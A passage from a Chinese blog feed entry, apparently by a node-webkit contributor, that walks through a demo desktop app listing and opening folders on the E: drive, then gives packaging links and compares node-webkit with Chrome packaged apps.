Application的流畅性。</li><li>前面介绍Content API的时候也提到了，HTML5的特性以及GPU加速，对WebGL等的支持。最新版本在html5test.com测试得到的分数是：460。</li></ul></blockquote></li></ul><p>###如何使用其进行开发？</p><p>接下来的这个部分将完成一个简单的应用程序。主要想体现的是：（1）使用node.js模块；（2）nw提供的增加本地化应用特性的API；（3）打包并发布你的应用程序。</p><ul><li>了解应用程序结构。如下图所示，每个应用程序都会有一个package.json文件来描述应用程序的相关信息以及初始窗口的属性等。<br><img src="/images/package.png" alt="package"></li></ul><p>示例程序的package.json文件内容如下：（关于各个参数所代表的含义可以在wiki上查找：<a href="https://github.com/rogerwang/node-webkit/wiki/Manifest-format" target="_blank" rel="noopener">Link</a>）<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"nw-demo"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.html"</span>,</span><br><span class="line">  <span class="attr">"window"</span>: &#123;</span><br><span class="line">    <span class="attr">"toolbar"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"width"</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">"height"</span>: <span class="number">600</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>index.html文件的内容如下，该段代码主要是使用node.js的fs模块读取”E:/“目录下的文件夹，在每个文件夹的点击事件中，我们调用node-webkit中提供的shell接口在窗口管理器中打开该文件夹。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      body &#123;font-family: Georgia,serif;&#125;</span></span><br><span class="line"><span class="undefined">      h1 &#123;color: #527bbd;margin-bottom: 1.0em;line-height: 1.3;</span></span><br><span class="line"><span class="undefined">        border-bottom: 2px solid silver;&#125;</span></span><br><span class="line"><span class="undefined">      .item &#123;border-bottom: 2px solid silver;padding: 10px;cursor: pointer;&#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Filesystem of your E:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      // Load native UI library.</span></span><br><span class="line"><span class="undefined">      var gui = require('nw.gui');</span></span><br><span class="line"><span class="undefined">      require('fs').readdir('E:/', function(err, files) &#123;</span></span><br><span class="line"><span class="undefined">        if (err) &#123;</span></span><br><span class="line"><span class="undefined">          document.write(err);</span></span><br><span class="line"><span class="undefined">        &#125; else &#123;</span></span><br><span class="line"><span class="undefined">          for (var i = 0; i &lt; files.length; ++i) &#123;</span></span><br><span class="line"><span class="undefined">            var div = document.createElement('div'); </span></span><br><span class="line"><span class="undefined">            div.className = "item";</span></span><br><span class="line"><span class="undefined">            var content = document.createTextNode(files[i]);</span></span><br><span class="line"><span class="undefined">            div.appendChild(content);</span></span><br><span class="line"><span class="undefined">            document.body.appendChild(div);</span></span><br><span class="line"><span class="undefined">            div.onclick = function() &#123;</span></span><br><span class="line"><span class="undefined">              gui.Shell.openItem('E:/' + this.innerText);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>打包应用并发布。具体的打包方法<a href="https://github.com/rogerwang/node-webkit/wiki/How-to-package-and-distribute-your-apps" target="_blank" rel="noopener">Link</a>。效果图</li></ul><p><img src="/images/effect.png" alt="effect"></p><p>###扯点node-webkit与chrome packaged app的不同。</p><ul><li><p>更少的开发限制，更自由：在node-webkit中，我们可以发现其sandbox特性已经被关闭。熟悉chrome packaged app或者extension开发的人都知道其对安全性的要求之严格，比如CSP的限制。而在node-webkit中，这些限制都不存在，作为一个本地化的应用程序运行时环境，我个人觉得这个是非常重要的一点！</p></li><li><p>更本地化的接口：node-webkit实现了很多有关窗口操作的API，同时也实现了像菜单栏，系统的托盘图标支持，系统剪贴板等的API，目前还在不断的完善中。（我自己也参与到了一部分API的开发中，同时也修复了一些小bug。）</p></li></ul><p>最后：目前采用node-webkit开发出来的应用程序列表：<a href="https://github.com/rogerwang/node-webkit/wiki/List-of-apps-and-companies-using-node-webkit" target="_blank" rel="noopener">Link</a>，据我所知道<a href="http://www.lighttable.com/" target="_blank" rel="noopener">LightTable</a>也是基于node-webkit实现的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这两个月来接触到一个开源项目：node-webkit（项目地址：&lt;a href=&quot;https://github.com/rogerwang/node-webkit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Link&lt;/a&gt;），也做了一点点小小的Code
      
    
    </summary>
    
      <category term="node-webkit" scheme="http://zhchbin.github.io/categories/node-webkit/"/>
    
    
  </entry>
  
</feed>
